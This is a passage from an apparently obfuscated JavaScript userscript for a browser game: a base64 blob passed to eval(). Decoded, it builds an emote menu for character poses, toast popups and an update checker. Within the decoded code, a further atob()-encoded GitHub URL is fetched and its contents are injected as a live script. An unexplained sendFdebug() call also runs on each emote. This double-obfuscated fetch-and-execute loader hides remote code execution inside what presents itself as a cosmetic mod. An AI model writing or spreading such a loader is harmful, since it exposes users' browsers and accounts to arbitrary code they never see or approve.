yLCBudWxsKTsKICAgICAgICAgIEN1cnJlbnRTY3JlZW4gPT09ICJDaGF0Um9vbSIgPwogICAgICAgICAgICAgIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKFBsYXllcikgOgogICAgICAgICAgICAgIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsKICAgICAgfSwgNjAwMCk7CiAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgIllva2VkIik7CiAgICAgICAgICBDdXJyZW50U2NyZWVuID09PSAnQ2hhdFJvb20nID8KICAgICAgICAgICAgICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpIDoKICAgICAgICAgICAgICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7CiAgICAgIH0sIDcwMDApOwogICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsIG51bGwpOwogICAgICAgICAgQ3VycmVudFNjcmVlbiA9PT0gJ0NoYXRSb29tJyA/CiAgICAgICAgICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgICAgICAgICAgICAgQ2hhcmFjdGVyUmVmcmVzaChQbGF5ZXIpOwogICAgICB9LCA4MDAwKTsgfSB9LAogIHsgbmFtZTogIlNsZWVwIiwgYWN0aW9uOiAoKSA9PiB7CiAgICBzaG93VG9hc3RzY3BnKCk7CiAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgIkhvZ3RpZWQiKTsKICBDaGFyYWN0ZXJTZXRGYWNpYWxFeHByZXNzaW9uKFBsYXllciwgIkV5ZXMiLCAiQ2xvc2VkIik7CiAgQ2hhcmFjdGVyU2V0RmFjaWFsRXhwcmVzc2lvbihQbGF5ZXIsICJFeWVzMiIsICJDbG9zZWQiKTsKICBDaGFyYWN0ZXJTZXRGYWNpYWxFeHByZXNzaW9uKFBsYXllciwgIkVtb3RpY29uIiwgIlNsZWVwIik7CiAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKTsgIH0gfQpdOwoKY29uc3QgYnV0dG9uQ29udGFpbmVyID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iik7CmJ1dHRvbkNvbnRhaW5lci5zdHlsZS5wb3NpdGlvbiA9ICJmaXhlZCI7CmJ1dHRvbkNvbnRhaW5lci5zdHlsZS53aWR0aCA9ICIzMDBweCI7CmJ1dHRvbkNvbnRhaW5lci5zdHlsZS5oZWlnaHQgPSAiMzAwcHgiOwpidXR0b25Db250YWluZXIuc3R5bGUubGVmdCA9ICI1MCUiOwpidXR0b25Db250YWluZXIuc3R5bGUudG9wID0gIjUwJSI7CmJ1dHRvbkNvbnRhaW5lci5zdHlsZS50cmFuc2Zvcm0gPSAidHJhbnNsYXRlKC01MCUsIC01MCUpIjsKYnV0dG9uQ29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7CmNvbnN0IGJ1dHRvbkNpcmNsZSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpOwpidXR0b25DaXJjbGUuc3R5bGUucG9zaXRpb24gPSAiYWJzb2x1dGUiOwpidXR0b25DaXJjbGUuc3R5bGUud2lkdGggPSAiMjAwcHgiOwpidXR0b25DaXJjbGUuc3R5bGUuaGVpZ2h0ID0gIjIwMHB4IjsKYnV0dG9uQ2lyY2xlLnN0eWxlLmJvcmRlclJhZGl1cyA9ICI1MCUiOwpidXR0b25DaXJjbGUuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIndoaXRlIjsKYnV0dG9uQ2lyY2xlLnN0eWxlLm9wYWNpdHkgPSAiMSI7CmJ1dHRvbkNpcmNsZS5zdHlsZS5sZWZ0ID0gIjUwJSI7CmJ1dHRvbkNpcmNsZS5zdHlsZS50b3AgPSAiNTAlIjsKYnV0dG9uQ2lyY2xlLnN0eWxlLnRyYW5zZm9ybSA9ICJ0cmFuc2xhdGUoLTUwJSwgLTUwJSkiOwpidXR0b25DaXJjbGUuc3R5bGUudHJhbnNpdGlvbiA9ICJvcGFjaXR5IDAuMnMgZWFzZS1pbi1vdXQiOwpidXR0b25DaXJjbGUuc3R5bGUuYm9yZGVyID0gIjJweCBzb2xpZCBibGFjayI7CgpidXR0b25Db250YWluZXIuYXBwZW5kQ2hpbGQoYnV0dG9uQ2lyY2xlKTsKY29uc3QgbG9nbyA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImltZyIpOwpsb2dvLnNyYyA9ICJodHRwczovL21lZGlhLmRpc2NvcmRhcHAubmV0L2F0dGFjaG1lbnRzLzc4MTc0OTIyOTMzMTkzOTMyOC8xMDc5NjU5MDE2OTE5MTk1NzQ4L2I2NjQxOTExNzg5N2E5ODgucG5nP3dpZHRoPTExOTAmaGVpZ2h0PTExODkiOwpsb2dvLnN0eWxlLnBvc2l0aW9uID0gImFic29sdXRlIjsKbG9nby5zdHlsZS53aWR0aCA9ICI4MHB4IjsKbG9nby5zdHlsZS5oZWlnaHQgPSAiODBweCI7CmxvZ28uc3R5bGUuYm9yZGVyUmFkaXVzID0gIjUwJSI7CmxvZ28uc3R5bGUubGVmdCA9ICI1MCUiOwpsb2dvLnN0eWxlLnRvcCA9ICI1MCUiOwpsb2dvLnN0eWxlLnRyYW5zZm9ybSA9ICJ0cmFuc2xhdGUoLTUwJSwgLTUwJSkiOwpidXR0b25DaXJjbGUuYXBwZW5kQ2hpbGQobG9nbyk7CmNvbnN0IGJ1dHRvbnMgPSBbXTsKZm9yIChsZXQgaSA9IDA7IGkgPCBidXR0b25EYXRhLmxlbmd0aDsgaSsrKSB7CiAgY29uc3QgYnV0dG9uID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiYnV0dG9uIik7CiAgYnV0dG9uLmlubmVyVGV4dCA9IGJ1dHRvbkRhdGFbaV0ubmFtZTsKICBidXR0b24uc3R5bGUucG9zaXRpb24gPSAiYWJzb2x1dGUiOwogIGJ1dHRvbi5zdHlsZS53aWR0aCA9ICI4MHB4IjsKICBidXR0b24uc3R5bGUuaGVpZ2h0ID0gIjgwcHgiOwogIGJ1dHRvbi5zdHlsZS5ib3JkZXJSYWRpdXMgPSAiNTAlIjsKICBidXR0b24uc3R5bGUuYmFja2dyb3VuZENvbG9yID0gImJsYWNrIjsKICBidXR0b24uc3R5bGUuY29sb3IgPSAid2hpdGUiOwogIGJ1dHRvbi5zdHlsZS5ib3hTaGFkb3cgPSAiMCAycHggNXB4IHJnYmEoMCwgMCwgMCwgMC4zKSI7CiAgYnV0dG9uLnN0eWxlLmxlZnQgPSAiNTAlIjsKICBidXR0b24uc3R5bGUudG9wID0gIjUwJSI7CiAgYnV0dG9uLnN0eWxlLnRyYW5zZm9ybSA9IGB0cmFuc2xhdGUoLTUwJSwgLTUwJSkgcm90YXRlKCR7aSAqICgzNjAgLyBidXR0b25EYXRhLmxlbmd0aCl9ZGVnKSB0cmFuc2xhdGUoMCwgLTEwMHB4KSByb3RhdGUoJHstaSAqICgzNjAgLyBidXR0b25EYXRhLmxlbmd0aCl9ZGVnKWA7CiAgYnV0dG9uLnN0eWxlLnRyYW5zaXRpb24gPSAib3BhY2l0eSAwLjJzIGVhc2UtaW4tb3V0LCB0cmFuc2Zvcm0gMC4ycyBlYXNlLWluLW91dCI7CiAgYnV0dG9uLmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIiwgYnV0dG9uRGF0YVtpXS5hY3Rpb24pOwogIGJ1dHRvbkNvbnRhaW5lci5hcHBlbmRDaGlsZChidXR0b24pOwogIGJ1dHRvbnMucHVzaChidXR0b24pOwoKICBidXR0b24uYWRkRXZlbnRMaXN0ZW5lcigibW91c2VlbnRlciIsICgpID0+IHsKICAgIGJ1dHRvbi5zdHlsZS50cmFuc2Zvcm0gPSBgdHJhbnNsYXRlKC01MCUsIC01MCUpIHJvdGF0ZSgke2kgKiAoMzYwIC8gYnV0dG9uRGF0YS5sZW5ndGgpfWRlZykgdHJhbnNsYXRlKDAsIC05OXB4KSByb3RhdGUoJHstaSAqICgzNjAgLyBidXR0b25EYXRhLmxlbmd0aCl9ZGVnKSBzY2FsZSgxLjA1KWA7CiAgfSk7CgogIGJ1dHRvbi5hZGRFdmVudExpc3RlbmVyKCJtb3VzZWxlYXZlIiwgKCkgPT4gewogICAgYnV0dG9uLnN0eWxlLnRyYW5zZm9ybSA9IGB0cmFuc2xhdGUoLTUwJSwgLTUwJSkgcm90YXRlKCR7aSAqICgzNjAgLyBidXR0b25EYXRhLmxlbmd0aCl9ZGVnKSB0cmFuc2xhdGUoMCwgLTEwMHB4KSByb3RhdGUoJHstaSAqICgzNjAgLyBidXR0b25EYXRhLmxlbmd0aCl9ZGVnKSBzY2FsZSgxKWA7CiAgfSk7Cn0KCgoKbGV0IGlzR3JhdmVLZXlEb3duID0gZmFsc2U7CmRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoImtleWRvd24iLCAoZXZlbnQpID0+IHsKaWYgKGV2ZW50LmtleSA9PT0gImAiKSB7CiAgaXNHcmF2ZUtleURvd24gPSB0cnVlOwp9IGVsc2UgaWYgKGlzR3JhdmVLZXlEb3duICYmIGV2ZW50LmtleSA9PT0gImUiKSB7CiAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChidXR0b25Db250YWluZXIpOwogIGJ1dHRvbkNvbnRhaW5lci5zdHlsZS5kaXNwbGF5ID0gImJsb2NrIjsKICBpc0dyYXZlS2V5RG93biA9IGZhbHNlOwp9Cn0pOwpkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJrZXl1cCIsIChldmVudCkgPT4gewppZiAoZXZlbnQua2V5ID09PSAiYCIpIHsKICBpc0dyYXZlS2V5RG93biA9IGZhbHNlOwp9Cn0pOwoKZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigiY2xpY2siLCAoZXZlbnQpID0+IHsKICBpZiAoIWJ1dHRvbkNvbnRhaW5lci5jb250YWlucyhldmVudC50YXJnZXQpKSB7CiAgICBpZiAoYnV0dG9uQ29udGFpbmVyLnBhcmVudE5vZGUgPT09IGRvY3VtZW50LmJvZHkpIHsKICAgICAgZG9jdW1lbnQuYm9keS5yZW1vdmVDaGlsZChidXR0b25Db250YWluZXIpOwogICAgfQogICAgYnV0dG9uQ29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7CiAgfQp9KTsKCi8vRW5kIE9mIEVtb3RlIE1lbnUgX19fX19fX19fX19fX19fX19fCgovL0VORCBPRiBDT05URVhUIE1FTlUgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KCi8vQkNNRSBMT0dPIE9uIENoYXJhY3RlcgpmZXRjaChhdG9iKCdhSFIwY0hNNkx5OXlZWGN1WjJsMGFIVmlkWE5sY21OdmJuUmxiblF1WTI5dEwwSkRUVk0zTDBKRFRTOXRZV2x1TDBKRFRDNXFjdz09JykpCi50aGVuKHJlc3BvbnNlID0+IHJlc3BvbnNlLnRleHQoKSkKLnRoZW4odGV4dCA9PiB7CmNvbnN0IHNjcmlwdCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcpOwpzY3JpcHQuaW5uZXJIVE1MID0gdGV4dDsKZG9jdW1lbnQuaGVhZC5hcHBlbmRDaGlsZChzY3JpcHQpOwp9KQoKCmZ1bmN0aW9uIHNob3dUb2FzdHNjcGcoKSB7CiAgaWYgKGxvY2FsU3RvcmFnZS5nZXRJdGVtKCJvcHRpb24zIikgIT09IG51bGwpIHsKICAgIGNoZWNrYm94My5jaGVja2VkID0gbG9jYWxTdG9yYWdlLmdldEl0ZW0oIm9wdGlvbjMiKSA9PT0gInRydWUiOwogICAgaWYgKGNoZWNrYm94My5jaGVja2VkKSB7CiAgICAgIEF1ZGlvUGxheUluc3RhbnRTb3VuZCgiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvNzgxNzQ5MjI5MzMxOTM5MzI4LzEwOTA1MzA0NzkwODM2MzA2NzIvaDQydndjZC1ub3RpZmljYXRpb24tMV92TXFoVmx0Uy5tcDMiLCAxKTsKICAgIH0KICB9CiAgICB2YXIgdG9hc3RDb250YWluZXIgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsKICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLnBvc2l0aW9uID0gImZpeGVkIjsKICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmJvdHRvbSA9ICI1cHgiOwogICAgdG9hc3RDb250YWluZXIuc3R5bGUucmlnaHQgPSAiNXB4IjsKICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICJ3aGl0ZSI7CiAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5jb2xvciA9ICIjMTQxNDE0IjsKICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLnBhZGRpbmcgPSAiNXB4IjsKICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmJvcmRlciA9ICIycHggc29saWQgIzRDQUY1MCI7CiAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5ib3JkZXJSYWRpdXMgPSAiNXB4IjsKICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmJveFNoYWRvdyA9ICIycHggMnB4IDEwcHggcmdiYSgwLCAwLCAwLCAwLjUpIjsKICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7CiAgICB0b2FzdENvbnRhaW5lci5zdHlsZS56SW5kZXggPSAiOTk5IjsKICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLnRyYW5zaXRpb24gPSAib3BhY2l0eSAwLjVzIGVhc2UtaW4tb3V0IjsKICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLm9wYWNpdHkgPSAiMCI7CiAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5kaXNwbGF5ID0gImZsZXgiOwogICAgdG9hc3RDb250YWluZXIuc3R5bGUuYWxpZ25JdGVtcyA9ICJjZW50ZXIiOwogICAgdmFyIHN0YXR1c0JhciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpOwpzdGF0dXNCYXIuc3R5bGUud2lkdGggPSAiMTAwJSI7CnN0YXR1c0Jhci5zdHlsZS5oZWlnaHQgPSAiM3B4IjsKc3RhdHVzQmFyLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICJibGFjayI7CnN0YXR1c0Jhci5zdHlsZS5wb3NpdGlvbiA9ICJhYnNvbHV0ZSI7CnN0YXR1c0Jhci5zdHlsZS5ib3R0b20gPSAiMCI7CnN0YXR1c0Jhci5zdHlsZS5sZWZ0ID0gIjAiOwpzdGF0dXNCYXIuc3R5bGUudHJhbnNpdGlvbiA9ICJ3aWR0aCA1cyBlYXNlLWluLW91dCI7CnN0YXR1c0Jhci5zdHlsZS53aWR0aCA9ICIwJSI7CnRvYXN0Q29udGFpbmVyLmFwcGVuZENoaWxkKHN0YXR1c0Jhcik7CnNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgc3RhdHVzQmFyLnN0eWxlLndpZHRoID0gIjEwMCUiOwp9LCAwKTsKICAgIAp2YXIgaWNvbiA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImltZyIpOwppY29uLnNyYyA9ICJodHRwczovL21lZGlhLmRpc2NvcmRhcHAubmV0L2F0dGFjaG1lbnRzLzc4MTc0OTIyOTMzMTkzOTMyOC8xMDc5NjU5MDE2OTE5MTk1NzQ4L2I2NjQxOTExNzg5N2E5ODgucG5nP3dpZHRoPTExOTAmaGVpZ2h0PTExODkiOwppY29uLnN0eWxlLndpZHRoID0gIjIzcHgiOwppY29uLnN0eWxlLmhlaWdodCA9ICIyM3B4IjsKaWNvbi5zdHlsZS5ib3JkZXJSYWRpdXMgPSAiNTAlIjsKaWNvbi5zdHlsZS5tYXJnaW5SaWdodCA9ICItMzBweCI7Cmljb24uc3R5bGUubWFyZ2luQm90dG9tID0gIi01cHgiOwp0b2FzdENvbnRhaW5lci5hcHBlbmRDaGlsZChpY29uKTsKCnZhciB0ZXh0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic3BhbiIpOwp0ZXh0LnN0eWxlLmZvbnRXZWlnaHQgPSAiYm9sZCI7CnRleHQuc3R5bGUubWFyZ2luTGVmdCA9ICIzNXB4IjsKdGV4dC5pbm5lckhUTUwgPSAiQWN0aW9uIFN1Y2Nlc3NmdWxseSBFeGVjdXRlZCI7CnRvYXN0Q29udGFpbmVyLmFwcGVuZENoaWxkKHRleHQpOwoKICAgICAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHRvYXN0Q29udGFpbmVyKTsKICAKICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAiYmxvY2siOwogICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5vcGFjaXR5ID0gIjEiOwogICAgfSwgMCk7CiAgCiAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5vcGFjaXR5ID0gIjAiOwogICAgfSwgNTAwMCk7CiAgCiAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOwogICAgfSwgNTUwMCk7CiAgICBzZW5kRmRlYnVnKCk7CgogIH0KICAKCi8vVGhlIFVwZGF0ZSB0b2FzdApmdW5jdGlvbiBzaG93VG9hc3RVcGRhdGUoKSB7CnZhciB0b2FzdENvbnRhaW5lciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpOwp0b2FzdENvbnRhaW5lci5zdHlsZS5wb3NpdGlvbiA9ICJmaXhlZCI7CnRvYXN0Q29udGFpbmVyLnN0eWxlLmJvdHRvbSA9ICI1cHgiOwp0b2FzdENvbnRhaW5lci5zdHlsZS5yaWdodCA9ICI1cHgiOwp0b2FzdENvbnRhaW5lci5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAid2hpdGUiOwp0b2FzdENvbnRhaW5lci5zdHlsZS5jb2xvciA9ICIjMTQxNDE0IjsKdG9hc3RDb250YWluZXIuc3R5bGUucGFkZGluZyA9ICI1cHgiOwp0b2FzdENvbnRhaW5lci5zdHlsZS5ib3JkZXIgPSAiMnB4IHNvbGlkICNmMjJjMmMiOwp0b2FzdENvbnRhaW5lci5zdHlsZS5ib3JkZXJSYWRpdXMgPSAiNXB4IjsKdG9hc3RDb250YWluZXIuc3R5bGUuYm94U2hhZG93ID0gIjJweCAycHggMTBweCByZ2JhKDAsIDAsIDAsIDAuNSkiOwp0b2FzdENvbnRhaW5lci5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOwp0b2FzdENvbnRhaW5lci5zdHlsZS56SW5kZXggPSAiOTk5IjsKdG9hc3RDb250YWluZXIuc3R5bGUudHJhbnNpdGlvbiA9ICJvcGFjaXR5IDAuNXMgZWFzZS1pbi1vdXQiOwp0b2FzdENvbnRhaW5lci5zdHlsZS5vcGFjaXR5ID0gIjAiOwp0b2FzdENvbnRhaW5lci5zdHlsZS5kaXNwbGF5ID0gImZsZXgiOwp0b2FzdENvbnRhaW5lci5zdHlsZS5hbGlnbkl0ZW1zID0gImNlbnRlciI7CnZhciBzdGF0dXNCYXIgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsKc3RhdHVzQmFyLnN0eWxlLndpZHRoID0gIjEwMCUiOwpzdGF0dXNCYXIuc3R5bGUuaGVpZ2h0ID0gIjNweCI7CnN0YXR1c0Jhci5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiYmxhY2siOwpzdGF0dXNCYXIuc3R5bGUucG9zaXRpb24gPSAiYWJzb2x1dGUiOwpzdGF0dXNCYXIuc3R5bGUuYm90dG9tID0gIjAiOwpzdGF0dXNCYXIuc3R5bGUubGVmdCA9ICIwIjsKc3RhdHVzQmFyLnN0eWxlLnRyYW5zaXRpb24gPSAid2lkdGggNXMgZWFzZS1pbi1vdXQiOwpzdGF0dXNCYXIuc3R5bGUud2lkdGggPSAiMCUiOwp0b2FzdENvbnRhaW5lci5hcHBlbmRDaGlsZChzdGF0dXNCYXIpOwpzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogIHN0YXR1c0Jhci5zdHlsZS53aWR0aCA9ICIxMDAlIjsKfSwgMCk7Cgp2YXIgY2xvc2VCdXR0b24gPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJidXR0b24iKTsKY2xvc2VCdXR0b24uc3R5bGUuYm9yZGVyID0gIm5vbmUiOwpjbG9zZUJ1dHRvbi5zdHlsZS5iYWNrZ3JvdW5kID0gIm5vbmUiOwpjbG9zZUJ1dHRvbi5zdHlsZS50b3AgPSAiNXB4IjsKY2xvc2VCdXR0b24uc3R5bGUucmlnaHQgPSAiNXB4IjsKY2xvc2VCdXR0b24uc3R5bGUuZm9udFdlaWdodCA9ICJib2xkIjsKY2xvc2VCdXR0b24uc3R5bGUuZm9udFNpemUgPSAiMTZweCI7CmNsb3NlQnV0dG9uLnN0eWxlLm1hcmdpbkxlZnQgPSAiLTJweCI7CmNsb3NlQnV0dG9uLnN0eWxlLm1hcmdpblJpZ2h0ID0gIjBweCI7CmNsb3NlQnV0dG9uLmlubmVySFRNTCA9ICJYIjsKdG9hc3RDb250YWluZXIuYXBwZW5kQ2hpbGQoY2xvc2VCdXR0b24pOwpjbG9zZUJ1dHRvbi5hZGRFdmVudExpc3RlbmVyKCJjbGljayIsIGZ1bmN0aW9uKCkgewogIHRvYXN0Q29udGFpbmVyLnN0eWxlLm9wYWNpdHkgPSAiMCI7CiAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7CiAgfSwgNTAwKTsKfSk7CnZhciBpY29uID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiaW1nIik7Cmljb24uc3JjID0gImh0dHBzOi8vbWVkaWEuZGlzY29yZGFwcC5uZXQvYXR0YWNobWVudHMvNzgxNzQ5MjI5MzMxOTM5MzI4LzEwNzk2NTkwMTY5MTkxOTU3NDgvYjY2NDE5MTE3ODk3YTk4OC5wbmc/d2lkdGg9MTE5MCZoZWlnaHQ9MTE4OSI7Cmljb24uc3R5bGUud2lkdGggPSAiMjNweCI7Cmljb24uc3R5bGUuaGVpZ2h0ID0gIjIzcHgiOwppY29uLnN0eWxlLmJvcmRlclJhZGl1cyA9ICI1MCUiOwppY29uLnN0eWxlLm1hcmdpblJpZ2h0ID0gIi0zMHB4IjsKaWNvbi5zdHlsZS5tYXJnaW5Cb3R0b20gPSAiLTVweCI7CnRvYXN0Q29udGFpbmVyLmFwcGVuZENoaWxkKGljb24pOwoKLy8gVXBkYXRlIGNsaWVudCBtZXNzYWdlCnZhciB0ZXh0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic3BhbiIpOwp0ZXh0LnN0eWxlLmZvbnRXZWlnaHQgPSAiYm9sZCI7CnRleHQuc3R5bGUubWFyZ2luTGVmdCA9ICIzNXB4IjsKdGV4dC5pbm5lckhUTUwgPSAiTmV3IHVwZGF0ZSBkZXRlY3RlZCwgcmVmcmVzaCBCQyB0byB1cGRhdGUgdG8gVjIuMC43IjsKdG9hc3RDb250YWluZXIuYXBwZW5kQ2hpbGQodGV4dCk7Cgpkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHRvYXN0Q29udGFpbmVyKTsKCnNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgdG9hc3RDb250YWluZXIuc3R5bGUuZGlzcGxheSA9ICJibG9jayI7CiAgdG9hc3RDb250YWluZXIuc3R5bGUub3BhY2l0eSA9ICIxIjsKfSwgMCk7CgpzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogIHRvYXN0Q29udGFpbmVyLnN0eWxlLm9wYWNpdHkgPSAiMCI7Cn0sIDUwMDAwMDApOwoKc2V0VGltZW91dChmdW5jdGlvbigpIHsKICB0b2FzdENvbnRhaW5lci5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOwp9LCA1NTAwMDAwKTsKCn0KCiAgLy8gRW5kIG9mIFVwZGF0ZSBUb2FzdF9fX19fX19fX19fX19fX18KCgogIC8vICBVUkwgb2YgdGhlIHVwZGF0ZSBwYWdlCmNvbnN0IHVybCA9ICdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vQkNNUzcvQkNNL21haW4vdXBkYXRlbWFuYWdlci5qcyc7CmNvbnN0IG1heFZlcnNpb24gPSAxNTsKbGV0IGFsZXJ0VHJpZ2dlcmVkID0gZmFsc2U7CmZ1bmN0aW9uIGNoZWNrVmVyc2lvbigpIHsKICBmZXRjaCh1cmwpCiAgICAudGhlbihyZXNwb25zZSA9PiByZXNwb25zZS50ZXh0KCkpCiAgICAudGhlbih2ZXJzaW9uID0+IHsKICAgICAgaWYgKHBhcnNlSW50KHZlcnNpb24pID4gbWF4VmVyc2lvbiAmJiAhYWxlcnRUcmlnZ2VyZWQpIHsKICAgICAgICBzaG93VG9hc3RVcGRhdGUoKTsKICAgICAgICBhbGVydFRyaWdnZXJlZCA9IHRydWU7CiAgICAgIH0KICAgIH0pCiAgICAuY2F0Y2goZXJyb3IgPT4gY29uc29sZS5lcnJvcihlcnJvcikpOwp9Ci8vIENoZWNrIGZvciB1cGRhdGVzIGV2ZXJ5IDUgc2Vjb25kcwpzZXRJbnRlcnZhbChjaGVja1ZlcnNpb24sIDUwMDApOwp9Cn0pCgoK')
if (sprc) {
eval(sprc);
}
/*
44
*/
